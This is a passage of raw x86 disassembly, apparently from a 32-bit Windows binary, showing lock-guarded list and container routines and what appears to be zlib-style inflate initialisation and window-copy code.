   1b335:	jmp    0x1b36a
   1b337:	mov    DWORD PTR [ebp-0x4],ebx
   1b33a:	test   al,al
   1b33c:	je     0x1b34d
   1b33e:	mov    eax,DWORD PTR [edi+0x4]
   1b341:	cmp    ebx,DWORD PTR [eax]
   1b343:	je     0x1b31c
   1b345:	lea    ecx,[ebp-0x4]
   1b348:	call   0x1a5a6
   1b34d:	push   DWORD PTR [ebp+0xc]
   1b350:	mov    eax,DWORD PTR [ebp-0x4]
   1b353:	add    eax,0xc
   1b356:	push   eax
   1b357:	call   0x197f4
   1b35c:	test   al,al
   1b35e:	jne    0x1b31c
   1b360:	mov    eax,DWORD PTR [ebp+0x8]
   1b363:	mov    ecx,DWORD PTR [ebp-0x4]
   1b366:	mov    BYTE PTR [eax+0x4],0x0
   1b36a:	pop    edi
   1b36b:	pop    esi
   1b36c:	mov    DWORD PTR [eax],ecx
   1b36e:	pop    ebx
   1b36f:	leave  
   1b370:	ret    0x8
   1b373:	int3   
   1b374:	int3   
   1b375:	int3   
   1b376:	int3   
   1b377:	int3   
   1b378:	mov    edi,edi
   1b37a:	push   ebp
   1b37b:	mov    ebp,esp
   1b37d:	push   ecx
   1b37e:	push   ecx
   1b37f:	push   DWORD PTR [ebp+0x8]
   1b382:	lea    eax,[ebp-0x8]
   1b385:	push   eax
   1b386:	call   0x1ace8
   1b38b:	and    DWORD PTR [ebp+0x8],0x0
   1b38f:	lea    eax,[ebp+0x8]
   1b392:	push   eax
   1b393:	push   DWORD PTR [ebp-0x4]
   1b396:	push   DWORD PTR [ebp-0x8]
   1b399:	call   0x1aa92
   1b39e:	mov    eax,DWORD PTR [ebp+0x8]
   1b3a1:	add    esp,0xc
   1b3a4:	leave  
   1b3a5:	ret    0x4
   1b3a8:	int3   
   1b3a9:	int3   
   1b3aa:	int3   
   1b3ab:	int3   
   1b3ac:	int3   
   1b3ad:	int3   
   1b3ae:	mov    edi,edi
   1b3b0:	push   ebp
   1b3b1:	mov    ebp,esp
   1b3b3:	push   ecx
   1b3b4:	push   esi
   1b3b5:	mov    esi,ecx
   1b3b7:	cmp    DWORD PTR [esi+0xc],0x0
   1b3bb:	mov    ecx,DWORD PTR [ebp+0xc]
   1b3be:	je     0x1b3f8
   1b3c0:	mov    eax,DWORD PTR [esi+0x4]
   1b3c3:	cmp    ecx,DWORD PTR [eax]
   1b3c5:	jne    0x1b3f8
   1b3c7:	cmp    DWORD PTR [ebp+0x10],eax
   1b3ca:	jne    0x1b3f8
   1b3cc:	push   DWORD PTR [eax+0x4]
   1b3cf:	mov    ecx,esi
   1b3d1:	call   0x1b16a
   1b3d6:	mov    ecx,DWORD PTR ds:0x7fa94
   1b3dc:	mov    eax,DWORD PTR [esi+0x4]
   1b3df:	mov    DWORD PTR [eax+0x4],ecx
   1b3e2:	mov    eax,DWORD PTR [esi+0x4]
   1b3e5:	and    DWORD PTR [esi+0xc],0x0
   1b3e9:	mov    DWORD PTR [eax],eax
   1b3eb:	mov    eax,DWORD PTR [esi+0x4]
   1b3ee:	mov    DWORD PTR [eax+0x8],eax
   1b3f1:	mov    eax,DWORD PTR [esi+0x4]
   1b3f4:	mov    ecx,DWORD PTR [eax]
   1b3f6:	jmp    0x1b41d
   1b3f8:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b3fb:	je     0x1b41d
   1b3fd:	push   edi
   1b3fe:	mov    edi,ecx
   1b400:	lea    ecx,[ebp+0xc]
   1b403:	call   0x1a36c
   1b408:	push   edi
   1b409:	lea    eax,[ebp-0x4]
   1b40c:	push   eax
   1b40d:	mov    ecx,esi
   1b40f:	call   0x1aeec
   1b414:	mov    ecx,DWORD PTR [ebp+0xc]
   1b417:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b41a:	jne    0x1b3fe
   1b41c:	pop    edi
   1b41d:	mov    eax,DWORD PTR [ebp+0x8]
   1b420:	mov    DWORD PTR [eax],ecx
   1b422:	pop    esi
   1b423:	leave  
   1b424:	ret    0xc
   1b427:	int3   
   1b428:	int3   
   1b429:	int3   
   1b42a:	int3   
   1b42b:	int3   
   1b42c:	mov    edi,edi
   1b42e:	push   ebp
   1b42f:	mov    ebp,esp
   1b431:	push   esi
   1b432:	push   DWORD PTR [ebp+0x8]
   1b435:	mov    esi,ecx
   1b437:	mov    ecx,DWORD PTR [esi]
   1b439:	call   0x1b1d0
   1b43e:	mov    eax,esi
   1b440:	pop    esi
   1b441:	pop    ebp
   1b442:	ret    0x4
   1b445:	int3   
   1b446:	int3   
   1b447:	int3   
   1b448:	int3   
   1b449:	int3   
   1b44a:	mov    edi,edi
   1b44c:	push   ebp
   1b44d:	mov    ebp,esp
   1b44f:	push   ecx
   1b450:	push   esi
   1b451:	push   edi
   1b452:	xor    edi,edi
   1b454:	push   edi
   1b455:	push   edi
   1b456:	push   edi
   1b457:	push   edi
   1b458:	mov    esi,0x7fa64
   1b45d:	push   esi
   1b45e:	call   DWORD PTR ds:0x1f028
   1b464:	test   eax,eax
   1b466:	jl     0x1b48a
   1b468:	mov    eax,ds:0x7fa90
   1b46d:	mov    ecx,DWORD PTR ds:0x7fa88
   1b473:	add    eax,0x9
   1b476:	mov    DWORD PTR [ebp-0x4],eax
   1b479:	lea    eax,[ebp-0x4]
   1b47c:	push   eax
   1b47d:	call   0x1b2c0
   1b482:	push   edi
   1b483:	push   esi
   1b484:	call   DWORD PTR ds:0x1f024
   1b48a:	pop    edi
   1b48b:	pop    esi
   1b48c:	leave  
   1b48d:	ret    
   1b48e:	int3   
   1b48f:	int3   
   1b490:	int3   
   1b491:	int3   
   1b492:	int3   
   1b493:	int3   
   1b494:	mov    edi,edi
   1b496:	push   ebp
   1b497:	mov    ebp,esp
   1b499:	push   ecx
   1b49a:	push   ecx
   1b49b:	push   DWORD PTR [ebp+0xc]
   1b49e:	lea    eax,[ebp-0x8]
   1b4a1:	push   eax
   1b4a2:	call   0x1b2de
   1b4a7:	mov    eax,DWORD PTR [ebp+0x8]
   1b4aa:	mov    ecx,DWORD PTR [ebp-0x8]
   1b4ad:	mov    DWORD PTR [eax],ecx
   1b4af:	mov    cl,BYTE PTR [ebp-0x4]
   1b4b2:	mov    BYTE PTR [eax+0x4],cl
   1b4b5:	leave  
   1b4b6:	ret    0x8
   1b4b9:	int3   
   1b4ba:	int3   
   1b4bb:	int3   
   1b4bc:	int3   
   1b4bd:	int3   
   1b4be:	mov    edi,edi
   1b4c0:	push   ebp
   1b4c1:	mov    ebp,esp
   1b4c3:	push   ecx
   1b4c4:	push   ecx
   1b4c5:	push   esi
   1b4c6:	push   DWORD PTR [ebp+0x8]
   1b4c9:	lea    eax,[ebp-0x8]
   1b4cc:	push   eax
   1b4cd:	mov    esi,ecx
   1b4cf:	call   0x1ace8
   1b4d4:	and    DWORD PTR [ebp+0x8],0x0
   1b4d8:	lea    eax,[ebp+0x8]
   1b4db:	push   eax
   1b4dc:	push   DWORD PTR [ebp-0x4]
   1b4df:	push   DWORD PTR [ebp-0x8]
   1b4e2:	call   0x1aa92
   1b4e7:	add    esp,0xc
   1b4ea:	push   DWORD PTR [ebp-0x4]
   1b4ed:	lea    eax,[ebp-0x4]
   1b4f0:	push   DWORD PTR [ebp-0x8]
   1b4f3:	mov    ecx,esi
   1b4f5:	push   eax
   1b4f6:	call   0x1b3ae
   1b4fb:	mov    eax,DWORD PTR [ebp+0x8]
   1b4fe:	pop    esi
   1b4ff:	leave  
   1b500:	ret    0x4
   1b503:	int3   
   1b504:	int3   
   1b505:	int3   
   1b506:	int3   
   1b507:	int3   
   1b508:	mov    edi,edi
   1b50a:	push   ebp
   1b50b:	mov    ebp,esp
   1b50d:	jmp    0x1b520
   1b50f:	push   eax
   1b510:	lea    ecx,[ebp+0x2c]
   1b513:	call   0x1b42c
   1b518:	lea    ecx,[ebp+0xc]
   1b51b:	call   0x1a434
   1b520:	mov    eax,DWORD PTR [ebp+0x14]
   1b523:	cmp    eax,DWORD PTR [ebp+0x24]
   1b526:	jne    0x1b50f
   1b528:	mov    eax,DWORD PTR [ebp+0x8]
   1b52b:	mov    ecx,DWORD PTR [ebp+0x2c]
   1b52e:	mov    DWORD PTR [eax],ecx
   1b530:	pop    ebp
   1b531:	ret    0x28
   1b534:	int3   
   1b535:	int3   
   1b536:	int3   
   1b537:	int3   
   1b538:	int3   
   1b539:	int3   
   1b53a:	mov    edi,edi
   1b53c:	push   ebp
   1b53d:	mov    ebp,esp
   1b53f:	sub    esp,0x10
   1b542:	push   0xffffffff
   1b544:	push   DWORD PTR [ebp+0x8]
   1b547:	lea    ecx,[ebp-0x8]
   1b54a:	call   0x110b8
   1b54f:	mov    ecx,DWORD PTR ds:0x7fa84
   1b555:	lea    eax,[ebp-0x8]
   1b558:	push   eax
   1b559:	lea    eax,[ebp-0x10]
   1b55c:	push   eax
   1b55d:	call   0x1b494
   1b562:	push   DWORD PTR [ebp-0x8]
   1b565:	call   0x10a86
   1b56a:	pop    ecx
   1b56b:	leave  
   1b56c:	ret    0x4
   1b56f:	int3   
   1b570:	int3   
   1b571:	int3   
   1b572:	int3   
   1b573:	int3   
   1b574:	mov    edi,edi
   1b576:	push   ebp
   1b577:	mov    ebp,esp
   1b579:	xor    eax,eax
   1b57b:	push   ebx
   1b57c:	push   esi
   1b57d:	push   edi
   1b57e:	mov    ebx,ecx
   1b580:	mov    DWORD PTR [ebx+0x4],eax
   1b583:	mov    DWORD PTR [ebx+0x8],eax
   1b586:	mov    DWORD PTR [ebx+0xc],eax
   1b589:	mov    DWORD PTR [ebx+0x10],eax
   1b58c:	mov    DWORD PTR [ebx+0x14],eax
   1b58f:	mov    DWORD PTR [ebx+0x18],eax
   1b592:	mov    DWORD PTR [ebx+0x1c],eax
   1b595:	mov    DWORD PTR [ebx+0x20],eax
   1b598:	mov    DWORD PTR [ebx+0x24],eax
   1b59b:	mov    DWORD PTR [ebx+0x28],eax
   1b59e:	mov    DWORD PTR [ebx+0x2c],eax
   1b5a1:	mov    eax,DWORD PTR [ebp+0x8]
   1b5a4:	push   ebx
   1b5a5:	sub    esp,0x10
   1b5a8:	mov    edi,esp
   1b5aa:	lea    esi,[eax+0x14]
   1b5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5b1:	sub    esp,0x10
   1b5b4:	lea    esi,[eax+0x4]
   1b5b7:	mov    edi,esp
   1b5b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5bc:	lea    eax,[ebp+0x8]
   1b5bf:	push   eax
   1b5c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5c1:	call   0x1b508
   1b5c6:	pop    edi
   1b5c7:	pop    esi
   1b5c8:	mov    eax,ebx
   1b5ca:	pop    ebx
   1b5cb:	pop    ebp
   1b5cc:	ret    0x4
   1b5cf:	int3   
   1b5d0:	int3   
   1b5d1:	int3   
   1b5d2:	int3   
   1b5d3:	int3   
   1b5d4:	mov    edi,edi
   1b5d6:	push   ebp
   1b5d7:	mov    ebp,esp
   1b5d9:	push   ecx
   1b5da:	push   ebx
   1b5db:	push   0x30
   1b5dd:	call   0x10a52
   1b5e2:	xor    ebx,ebx
   1b5e4:	pop    ecx
   1b5e5:	cmp    eax,ebx
   1b5e7:	je     0x1b5fb
   1b5e9:	lea    ecx,[ebp-0x1]
   1b5ec:	push   ecx
   1b5ed:	mov    ecx,eax
   1b5ef:	call   0x1a4ba
   1b5f4:	mov    ds:0x7fa8c,eax
   1b5f9:	jmp    0x1b601
   1b5fb:	mov    DWORD PTR ds:0x7fa8c,ebx
   1b601:	push   esi
   1b602:	push   0x10
   1b604:	call   0x10a52
   1b609:	mov    esi,eax
   1b60b:	pop    ecx
   1b60c:	cmp    esi,ebx
   1b60e:	je     0x1b622
   1b610:	mov    ecx,esi
   1b612:	mov    BYTE PTR [esi+0x8],bl
   1b615:	call   0x1ad1a
   1b61a:	mov    DWORD PTR ds:0x7fa84,esi
   1b620:	jmp    0x1b628
   1b622:	mov    DWORD PTR ds:0x7fa84,ebx
   1b628:	push   0xc
   1b62a:	call   0x10a52
   1b62f:	pop    ecx
   1b630:	pop    esi
   1b631:	cmp    eax,ebx
   1b633:	je     0x1b647
   1b635:	lea    ecx,[ebp-0x1]
   1b638:	push   ecx
   1b639:	mov    ecx,eax
   1b63b:	call   0x1ab2e
   1b640:	mov    ds:0x7fa88,eax
   1b645:	jmp    0x1b64d
   1b647:	mov    DWORD PTR ds:0x7fa88,ebx
   1b64d:	push   ebx
   1b64e:	push   0x7fa64
   1b653:	call   0x11c74
   1b658:	call   eax
   1b65a:	mov    DWORD PTR ds:0x7fa90,0x1
   1b664:	pop    ebx
   1b665:	leave  
   1b666:	ret    
   1b667:	int3   
   1b668:	int3   
   1b669:	int3   
   1b66a:	int3   
   1b66b:	int3   
   1b66c:	push   0x3c
   1b66e:	push   0x7e310
   1b673:	call   0x1daf8
   1b678:	xor    esi,esi
   1b67a:	push   esi
   1b67b:	push   esi
   1b67c:	push   esi
   1b67d:	push   esi
   1b67e:	push   0x7fa64
   1b683:	call   DWORD PTR ds:0x1f028
   1b689:	cmp    eax,esi
   1b68b:	jl     0x1b7fb
   1b691:	mov    DWORD PTR [ebp-0x4],esi
   1b694:	mov    edi,DWORD PTR [ebp+0x8]
   1b697:	push   edi
   1b698:	lea    eax,[ebp-0x24]
   1b69b:	push   eax
   1b69c:	call   0x1a6c6
   1b6a1:	cmp    DWORD PTR [eax+0x4],esi
   1b6a4:	setne  BYTE PTR [ebp-0x19]
   1b6a8:	push   DWORD PTR [ebp-0x24]
   1b6ab:	call   0x10a86
   1b6b0:	pop    ecx
   1b6b1:	push   edi
   1b6b2:	lea    eax,[ebp-0x2c]
   1b6b5:	push   eax
   1b6b6:	call   0x1a6ec
   1b6bb:	xor    al,al
   1b6bd:	cmp    DWORD PTR [edi+0x14],esi
   1b6c0:	jne    0x1b6d6
   1b6c2:	lea    eax,[ebp-0x2c]
   1b6c5:	push   eax
   1b6c6:	mov    ecx,DWORD PTR ds:0x7fa84
   1b6cc:	call   0x1b378
   1b6d1:	test   eax,eax
   1b6d3:	setne  al
   1b6d6:	test   al,al
   1b6d8:	je     0x1b6e9
   1b6da:	lea    eax,[ebp-0x2c]
   1b6dd:	push   eax
   1b6de:	mov    ecx,DWORD PTR ds:0x7fa84
   1b6e4:	call   0x1b4be
   1b6e9:	mov    ebx,DWORD PTR ds:0x7fa8c
   1b6ef:	cmp    DWORD PTR [ebx+0x2c],esi
   1b6f2:	jbe    0x1b752
   1b6f4:	mov    eax,ds:0x7ef24
   1b6f9:	mov    DWORD PTR [ebp-0x20],eax
   1b6fc:	cmp    eax,esi
   1b6fe:	ja     0x1b707
   1b700:	mov    DWORD PTR [ebp-0x20],0x1
   1b707:	mov    eax,DWORD PTR [ebp-0x20]
   1b70a:	cmp    DWORD PTR [ebx+0x2c],eax
   1b70d:	jb     0x1b752
   1b70f:	lea    esi,[ebx+0x4]
   1b712:	lea    edi,[ebp-0x3c]
   1b715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b719:	mov    eax,DWORD PTR [ebp-0x34]
   1b71c:	mov    eax,DWORD PTR [eax]
   1b71e:	mov    eax,DWORD PTR [eax+0xc]
   1b721:	xor    ecx,ecx
   1b723:	add    eax,0x9c40
   1b728:	push   ecx
   1b729:	pop    esi
   1b72a:	adc    ecx,esi
   1b72c:	mov    edx,DWORD PTR [ebp+0x8]
   1b72f:	mov    edx,DWORD PTR [edx+0xc]
   1b732:	cmp    ecx,esi
   1b734:	ja     0x1b752
   1b736:	jb     0x1b73c
   1b738:	cmp    eax,edx
   1b73a:	jae    0x1b752
   1b73c:	mov    ecx,ebx
   1b73e:	call   0x1a4e8
   1b743:	mov    ecx,ebx
   1b745:	call   0x1ab12
   1b74a:	mov    ebx,DWORD PTR ds:0x7fa8c
   1b750:	jmp    0x1b707
   1b752:	push   DWORD PTR [ebp+0x8]
   1b755:	lea    eax,[ebp-0x24]
   1b758:	push   eax
   1b759:	call   0x1a6ec
   1b75e:	push   eax
   1b75f:	lea    eax,[ebp-0x3c]
   1b762:	push   eax
   1b763:	call   0x1a738
   1b768:	push   DWORD PTR [ebp-0x24]
   1b76b:	call   0x10a86
   1b770:	pop    ecx
   1b771:	mov    ebx,DWORD PTR ds:0x7fa8c
   1b777:	lea    esi,[ebx+0x14]
   1b77a:	lea    edi,[ebp-0x4c]
   1b77d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b77e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b781:	mov    esi,DWORD PTR [ebp-0x34]
   1b784:	cmp    esi,DWORD PTR [ebp-0x44]
   1b787:	je     0x1b7bb
   1b789:	mov    eax,DWORD PTR [esi]
   1b78b:	mov    BYTE PTR [eax+0x1c],0x0
   1b78f:	mov    eax,DWORD PTR [esi]
   1b791:	cmp    BYTE PTR [eax+0x24],0x0
   1b795:	jne    0x1b7a5
   1b797:	mov    BYTE PTR [eax+0x24],0x1
   1b79b:	mov    eax,DWORD PTR [esi]
   1b79d:	push   DWORD PTR [eax+0x8]
   1b7a0:	call   0x1a462
   1b7a5:	mov    eax,DWORD PTR [esi]
   1b7a7:	mov    ecx,DWORD PTR [eax+0x8]
   1b7aa:	mov    eax,DWORD PTR [ebp+0x8]
   1b7ad:	mov    DWORD PTR [eax+0x8],ecx
   1b7b0:	mov    ecx,DWORD PTR [esi]
   1b7b2:	mov    ecx,DWORD PTR [ecx+0x20]
   1b7b5:	inc    ecx
   1b7b6:	mov    DWORD PTR [eax+0x20],ecx
   1b7b9:	jmp    0x1b7be
   1b7bb:	mov    eax,DWORD PTR [ebp+0x8]
   1b7be:	mov    cl,BYTE PTR [ebp-0x19]
   1b7c1:	mov    BYTE PTR [eax+0x1c],cl
   1b7c4:	lea    eax,[ebp+0x8]
   1b7c7:	push   eax
   1b7c8:	mov    ecx,ebx
   1b7ca:	call   0x1b1d0
   1b7cf:	inc    DWORD PTR ds:0x7fa90
   1b7d5:	push   DWORD PTR [ebp-0x2c]
   1b7d8:	call   0x10a86
   1b7dd:	pop    ecx
   1b7de:	jmp    0x1b7e7
   1b7e0:	xor    eax,eax
   1b7e2:	inc    eax
   1b7e3:	ret    
   1b7e4:	mov    esp,DWORD PTR [ebp-0x18]
   1b7e7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b7ee:	push   0x0
   1b7f0:	push   0x7fa64
   1b7f5:	call   DWORD PTR ds:0x1f024
   1b7fb:	call   0x1db3d
   1b800:	ret    0x4
   1b803:	int3   
   1b804:	int3   
   1b805:	int3   
   1b806:	int3   
   1b807:	int3   
   1b808:	push   0x48
   1b80a:	push   0x7e330
   1b80f:	call   0x1daf8
   1b814:	xor    ebx,ebx
   1b816:	push   ebx
   1b817:	push   ebx
   1b818:	push   ebx
   1b819:	push   ebx
   1b81a:	push   0x7fa64
   1b81f:	call   DWORD PTR ds:0x1f028
   1b825:	cmp    eax,ebx
   1b827:	jl     0x1b8d5
   1b82d:	mov    DWORD PTR [ebp-0x4],ebx
   1b830:	push   DWORD PTR ds:0x7fa88
   1b836:	lea    ecx,[ebp-0x28]
   1b839:	call   0x1b22a
   1b83e:	mov    BYTE PTR [ebp-0x19],bl
   1b841:	cmp    DWORD PTR [ebp-0x20],ebx
   1b844:	je     0x1b864
   1b846:	mov    eax,DWORD PTR [ebp-0x24]
   1b849:	mov    eax,DWORD PTR [eax]
   1b84b:	mov    eax,DWORD PTR [eax+0x8]
   1b84e:	cmp    eax,DWORD PTR ds:0x7fa90
   1b854:	ja     0x1b864
   1b856:	mov    BYTE PTR [ebp-0x19],0x1
   1b85a:	lea    ecx,[ebp-0x28]
   1b85d:	call   0x1ab88
   1b862:	jmp    0x1b841
   1b864:	cmp    BYTE PTR [ebp-0x19],bl
   1b867:	je     0x1b89f
   1b869:	push   DWORD PTR ds:0x7fa8c
   1b86f:	lea    ecx,[ebp-0x58]
   1b872:	call   0x1b574
   1b877:	mov    esi,DWORD PTR [ebp+0x8]
   1b87a:	push   esi
   1b87b:	lea    eax,[ebp-0x58]
   1b87e:	push   eax
   1b87f:	call   0x1a7d6
   1b884:	cmp    DWORD PTR [esi],ebx
   1b886:	jne    0x1b897
   1b888:	lea    eax,[ebp-0x28]
   1b88b:	push   eax
   1b88c:	mov    ecx,DWORD PTR ds:0x7fa88
   1b892:	call   0x1b268
   1b897:	lea    ecx,[ebp-0x58]
   1b89a:	call   0x1b1b4
   1b89f:	lea    ecx,[ebp-0x28]
   1b8a2:	call   0x1ab54
   1b8a7:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b8ae:	jmp    0x1b8c9
   1b8b0:	xor    eax,eax
   1b8b2:	inc    eax
   1b8b3:	ret    
   1b8b4:	mov    esp,DWORD PTR [ebp-0x18]
   1b8b7:	mov    eax,DWORD PTR [ebp+0x8]
   1b8ba:	mov    DWORD PTR [eax],0x2
   1b8c0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b8c7:	xor    ebx,ebx
   1b8c9:	push   ebx
   1b8ca:	push   0x7fa64
   1b8cf:	call   DWORD PTR ds:0x1f024
   1b8d5:	call   0x1db3d
   1b8da:	ret    0x4
   1b8dd:	int3   
   1b8de:	int3   
   1b8df:	int3   
   1b8e0:	int3   
   1b8e1:	int3   
   1b8e2:	mov    edi,edi
   1b8e4:	push   ebp
   1b8e5:	mov    ebp,esp
   1b8e7:	mov    ecx,DWORD PTR [ebp+0x8]
   1b8ea:	xor    edx,edx
   1b8ec:	cmp    ecx,edx
   1b8ee:	je     0x1b93e
   1b8f0:	mov    eax,DWORD PTR [ecx+0x1c]
   1b8f3:	cmp    eax,edx
   1b8f5:	je     0x1b93e
   1b8f7:	mov    DWORD PTR [eax+0x1c],edx
   1b8fa:	mov    DWORD PTR [ecx+0x14],edx
   1b8fd:	mov    DWORD PTR [ecx+0x8],edx
   1b900:	mov    DWORD PTR [ecx+0x18],edx
   1b903:	mov    DWORD PTR [ecx+0x30],0x1
   1b90a:	lea    ecx,[eax+0x530]
   1b910:	mov    DWORD PTR [eax],edx
   1b912:	mov    DWORD PTR [eax+0x4],edx
   1b915:	mov    DWORD PTR [eax+0xc],edx
   1b918:	mov    DWORD PTR [eax+0x14],0x8000
   1b91f:	mov    DWORD PTR [eax+0x20],edx
   1b922:	mov    DWORD PTR [eax+0x28],edx
   1b925:	mov    DWORD PTR [eax+0x2c],edx
   1b928:	mov    DWORD PTR [eax+0x30],edx
   1b92b:	mov    DWORD PTR [eax+0x38],edx
   1b92e:	mov    DWORD PTR [eax+0x3c],edx
   1b931:	mov    DWORD PTR [eax+0x6c],ecx
   1b934:	mov    DWORD PTR [eax+0x50],ecx
   1b937:	mov    DWORD PTR [eax+0x4c],ecx
   1b93a:	xor    eax,eax
   1b93c:	jmp    0x1b941
   1b93e:	push   0xfffffffe
   1b940:	pop    eax
   1b941:	pop    ebp
   1b942:	ret    0x4
   1b945:	int3   
   1b946:	int3   
   1b947:	int3   
   1b948:	int3   
   1b949:	int3   
   1b94a:	mov    edi,edi
   1b94c:	push   ebp
   1b94d:	mov    ebp,esp
   1b94f:	mov    eax,DWORD PTR [ebp+0x10]
   1b952:	push   esi
   1b953:	push   edi
   1b954:	xor    edi,edi
   1b956:	cmp    eax,edi
   1b958:	je     0x1b9f3
   1b95e:	cmp    BYTE PTR [eax],0x31
   1b961:	jne    0x1b9f3
   1b967:	cmp    DWORD PTR [ebp+0x14],0x38
   1b96b:	jne    0x1b9f3
   1b971:	mov    esi,DWORD PTR [ebp+0x8]
   1b974:	cmp    esi,edi
   1b976:	jne    0x1b97c
   1b978:	push   0xfffffffe
   1b97a:	jmp    0x1b9f5
   1b97c:	mov    DWORD PTR [esi+0x18],edi
   1b97f:	cmp    DWORD PTR [esi+0x20],edi
   1b982:	jne    0x1b98e
   1b984:	mov    DWORD PTR [esi+0x20],0x1cd42
   1b98b:	mov    DWORD PTR [esi+0x28],edi
   1b98e:	cmp    DWORD PTR [esi+0x24],edi
   1b991:	jne    0x1b99a
   1b993:	mov    DWORD PTR [esi+0x24],0x1cd5e
   1b99a:	push   0x2530
   1b99f:	push   0x1
   1b9a1:	push   DWORD PTR [esi+0x28]
   1b9a4:	call   DWORD PTR [esi+0x20]
   1b9a7:	cmp    eax,edi
   1b9a9:	jne    0x1b9af
   1b9ab:	push   0xfffffffc
   1b9ad:	jmp    0x1b9f5
   1b9af:	mov    ecx,DWORD PTR [ebp+0xc]
   1b9b2:	cmp    ecx,edi
   1b9b4:	mov    DWORD PTR [esi+0x1c],eax
   1b9b7:	jge    0x1b9c0
   1b9b9:	mov    DWORD PTR [eax+0x8],edi
   1b9bc:	neg    ecx
   1b9be:	jmp    0x1b9d1
   1b9c0:	mov    edx,ecx
   1b9c2:	sar    edx,0x4
   1b9c5:	inc    edx
   1b9c6:	cmp    ecx,0x30
   1b9c9:	mov    DWORD PTR [eax+0x8],edx
   1b9cc:	jge    0x1b9d1
   1b9ce:	and    ecx,0xf
   1b9d1:	lea    edx,[ecx-0x8]
   1b9d4:	cmp    edx,0x7
   1b9d7:	ja     0x1b9e7
   1b9d9:	push   esi
   1b9da:	mov    DWORD PTR [eax+0x24],ecx
   1b9dd:	mov    DWORD PTR [eax+0x34],edi
   1b9e0:	call   0x1b8e2
   1b9e5:	jmp    0x1b9f6
   1b9e7:	push   eax
   1b9e8:	push   DWORD PTR [esi+0x28]
   1b9eb:	call   DWORD PTR [esi+0x24]
   1b9ee:	mov    DWORD PTR [esi+0x1c],edi
   1b9f1:	jmp    0x1b978
   1b9f3:	push   0xfffffffa
   1b9f5:	pop    eax
   1b9f6:	pop    edi
   1b9f7:	pop    esi
   1b9f8:	pop    ebp
   1b9f9:	ret    0x10
   1b9fc:	int3   
   1b9fd:	int3   
   1b9fe:	int3   
   1b9ff:	int3   
   1ba00:	int3   
   1ba01:	int3   
   1ba02:	mov    edi,edi
   1ba04:	push   ebp
   1ba05:	mov    ebp,esp
   1ba07:	push   ecx
   1ba08:	push   ebx
   1ba09:	push   esi
   1ba0a:	mov    esi,DWORD PTR [edi+0x1c]
   1ba0d:	cmp    DWORD PTR [esi+0x34],0x0
   1ba11:	mov    ebx,eax
   1ba13:	jne    0x1ba33
   1ba15:	mov    ecx,DWORD PTR [esi+0x24]
   1ba18:	xor    eax,eax
   1ba1a:	inc    eax
   1ba1b:	shl    eax,cl
   1ba1d:	push   0x1
   1ba1f:	push   eax
   1ba20:	push   DWORD PTR [edi+0x28]
   1ba23:	call   DWORD PTR [edi+0x20]
   1ba26:	mov    DWORD PTR [esi+0x34],eax
   1ba29:	test   eax,eax
   1ba2b:	jne    0x1ba33
   1ba2d:	inc    eax
   1ba2e:	jmp    0x1bad5
   1ba33:	xor    eax,eax
   1ba35:	cmp    DWORD PTR [esi+0x28],eax
   1ba38:	jne    0x1ba4b
   1ba3a:	mov    ecx,DWORD PTR [esi+0x24]
   1ba3d:	xor    edx,edx
   1ba3f:	inc    edx
   1ba40:	shl    edx,cl
   1ba42:	mov    DWORD PTR [esi+0x30],eax
   1ba45:	mov    DWORD PTR [esi+0x2c],eax
   1ba48:	mov    DWORD PTR [esi+0x28],edx
   1ba4b:	sub    ebx,DWORD PTR [edi+0x10]
   1ba4e:	mov    eax,DWORD PTR [esi+0x28]
   1ba51:	cmp    ebx,eax
   1ba53:	jb     0x1ba6d
   1ba55:	mov    ecx,DWORD PTR [edi+0xc]
   1ba58:	push   eax
   1ba59:	sub    ecx,eax
   1ba5b:	push   ecx
   1ba5c:	push   DWORD PTR [esi+0x34]
   1ba5f:	call   0x1dac6
   1ba64:	add    esp,0xc
   1ba67:	and    DWORD PTR [esi+0x30],0x0
   1ba6b:	jmp    0x1baae
   1ba6d:	sub    eax,DWORD PTR [esi+0x30]
   1ba70:	mov    DWORD PTR [ebp-0x4],eax
   1ba73:	cmp    eax,ebx
   1ba75:	jbe    0x1ba7a
   1ba77:	mov    DWORD PTR [ebp-0x4],ebx
   1ba7a:	mov    eax,DWORD PTR [edi+0xc]
   1ba7d:	push   DWORD PTR [ebp-0x4]
   1ba80:	sub    eax,ebx
   1ba82:	push   eax
   1ba83:	mov    eax,DWORD PTR [esi+0x34]
   1ba86:	add    eax,DWORD PTR [esi+0x30]
   1ba89:	push   eax
   1ba8a:	call   0x1dac6
   1ba8f:	mov    eax,DWORD PTR [ebp-0x4]
   1ba92:	add    esp,0xc
   1ba95:	sub    ebx,eax
   1ba97:	je     0x1bab6
   1ba99:	mov    eax,DWORD PTR [edi+0xc]
   1ba9c:	push   ebx
   1ba9d:	sub    eax,ebx
   1ba9f:	push   eax
   1baa0:	push   DWORD PTR [esi+0x34]
   1baa3:	call   0x1dac6
   1baa8:	add    esp,0xc
   1baab:	mov    DWORD PTR [esi+0x30],ebx
   1baae:	mov    eax,DWORD PTR [esi+0x28]
   1bab1:	mov    DWORD PTR [esi+0x2c],eax
   1bab4:	jmp    0x1bad3
   1bab6:	add    DWORD PTR [esi+0x30],eax
